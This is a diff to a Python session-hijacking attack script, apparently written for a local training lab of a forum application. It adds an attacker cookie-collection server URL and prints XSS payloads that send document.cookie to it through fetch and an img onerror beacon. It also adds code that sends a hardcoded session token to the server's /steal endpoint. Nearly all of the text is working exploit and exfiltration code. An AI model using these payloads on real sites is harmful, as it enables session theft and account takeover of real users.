@@ -4,7 +4,8 @@ import sys
 from urllib.parse import urljoin
 
 # Target application configuration
-TARGET_URL = "http://localhost:5000"
+TARGET_URL = "http://localhost:5009"
+ATTACKER_SERVER_URL = "http://localhost:8888"
 SESSION_COOKIE_NAME = "PCYB_forum_session"
 # Known/predictable session token from the application code
 HIJACKED_SESSION_TOKEN = "admin_session_token_pcyb"
@@ -76,16 +77,34 @@ class SessionHijacker:
         
         print("[i] The application sets cookies with httponly=False")
         print("[i] This allows JavaScript to access cookies via document.cookie")
+        print(f"\n[i] Attacker's cookie stealing server: {ATTACKER_SERVER_URL}")
         print("\n[i] Example XSS payload that would steal the cookie:")
         print("    <script>")
-        print("      fetch('https://attacker.com/steal?cookie=' + document.cookie);")
+        print(f"      fetch('{ATTACKER_SERVER_URL}/steal?cookie=' + document.cookie);")
         print("    </script>")
         
         print("\n[i] Or in a URL parameter (if reflected without sanitization):")
-        print("    ?search=<img src=x onerror='new Image().src=\"https://attacker.com/?c=\"+document.cookie'>")
+        print(f"    ?search=<img src=x onerror='new Image().src=\"{ATTACKER_SERVER_URL}/steal?c=\"+document.cookie'>")
         
-        print("\n[*] In a real attack, the stolen cookie would be:")
-        print(f"    {SESSION_COOKIE_NAME}={HIJACKED_SESSION_TOKEN}")
+        print("\n[*] In a real attack, the stolen cookie would be sent to:")
+        print(f"    {ATTACKER_SERVER_URL}/steal?cookie={SESSION_COOKIE_NAME}={HIJACKED_SESSION_TOKEN}")
+        print("\n[*] Simulating actual cookie theft...")
+        
+        # Actually send the stolen cookie to attacker's server
+        try:
+            stolen_data = f"{SESSION_COOKIE_NAME}={HIJACKED_SESSION_TOKEN}"
+            response = requests.get(f"{ATTACKER_SERVER_URL}/steal", params={'cookie': stolen_data}, timeout=2)
+            if response.status_code == 200:
+                print(f"[✓] Cookie successfully sent to attacker's server!")
+                print(f"[✓] Check attacker's dashboard at: {ATTACKER_SERVER_URL}")
+            else:
+                print(f"[!] Server responded with status: {response.status_code}")
+        except requests.exceptions.ConnectionError:
+            print(f"[!] Warning: Attacker's server not reachable at {ATTACKER_SERVER_URL}")
+            print(f"[!] Make sure to run: docker-compose up -d")
+        except Exception as e:
+            print(f"[!] Error sending to attacker's server: {e}")
+        
         print("\n[*] Attacker then uses this stolen cookie to hijack the session")
     
     def demonstrate_session_replay(self):
